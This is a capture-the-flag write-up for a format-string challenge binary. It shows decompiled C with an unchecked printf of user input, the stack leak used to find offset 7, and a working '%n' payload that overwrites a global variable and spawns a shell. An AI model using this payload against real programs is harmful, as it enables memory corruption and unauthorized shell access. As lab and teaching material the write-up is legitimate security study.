#S0lved by H4yicl3

try to download the binary

try to analysis it with IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  printf(argv[1]);		//<--- bug here we can printf the address in stack
  if ( secret == 1337 )
    give_shell();		//modify secret we can have shell
  return 0;
}
int give_shell()
{
  __gid_t v0; // ST1C_4@1

  v0 = getegid();
  setresgid(v0, v0, v0);
  return system("/bin/sh -i");
}
```

find the address of secret
```
.bss:0804A030 secret          dd ?                    ; DATA XREF: main+9o
```

find the offset of secret in stack
```
./format `python -c 'print "\x30\xa0\x04\x08"+"%x_"*20'`
0ff84e0d4_ff84e0e0_f757e4ad_f76f63c4_f773e000_804852b_804a030_8048520_0_0_f7564af3_2_ff84e0d4_ff84e0e0_f772bcca_2_ff84e0d4_ff84e074_804a01c_804824c_
```

the offset is 7
we use the format <%d%offset$n> to change the value
```
./format `python -c 'print "\x30\xa0\x04\x08"+"%1333d%7$n"'`
0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            $ whoami
hayicle
$ 
```

well done!
